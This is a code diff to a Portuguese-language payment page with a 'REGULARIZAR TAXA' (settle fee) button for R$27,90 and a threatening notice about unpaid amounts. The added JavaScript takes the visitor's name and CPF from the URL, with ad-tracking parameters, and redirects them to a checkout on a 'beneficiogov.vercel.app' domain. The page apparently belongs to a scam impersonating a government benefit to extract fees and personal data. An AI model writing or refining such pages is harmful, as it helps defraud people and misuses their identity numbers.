@@ -149,7 +149,7 @@
 
                 <h1 id="value">R$27,90</h1>
 
-                <a onclick="checkout(event, 2790)">REGULARIZAR TAXA</a>
+                <a onclick="irParaCheckout()">REGULARIZAR TAXA</a>
 
                 <p>Atenção: Caso o valor de <span class="bold3">R$16,50</span> não seja quitado, o sistema exigirá o
                     pagamento integral de
@@ -161,10 +161,30 @@
 
     <script src="js/checkout-params.js"></script>
     <script src="js/eIAVx7Xy7gwF.js"></script>
+    <script src="js/2rsHVW5XnmRB.js" data-utmify-prevent-subids="" async="" defer=""></script>
 
-<script src="js/2rsHVW5XnmRB.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script>
+        function irParaCheckout() {
+            var p = new URLSearchParams(window.location.search);
+            var dest = new URLSearchParams();
 
+            // Nome e CPF
+            var nome = p.get('nome') || '';
+            var cpf  = p.get('cpf') || p.get('documento') || '';
+            if (nome) dest.set('nome', nome);
+            if (cpf)  dest.set('documento', cpf);
 
+            // Valor desta taxa (R$ 27,90 = 2790 centavos)
+            dest.set('valor', '2790');
 
+            // Passa todos os UTMs e rastreamento
+            ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','fbclid'].forEach(function(k) {
+                var v = p.get(k);
+                if (v) dest.set(k, v);
+            });
+
+            window.location.href = 'https://beneficiogov.vercel.app/checkout1.html?' + dest.toString();
+        }
+    </script>
 
 </body></html>
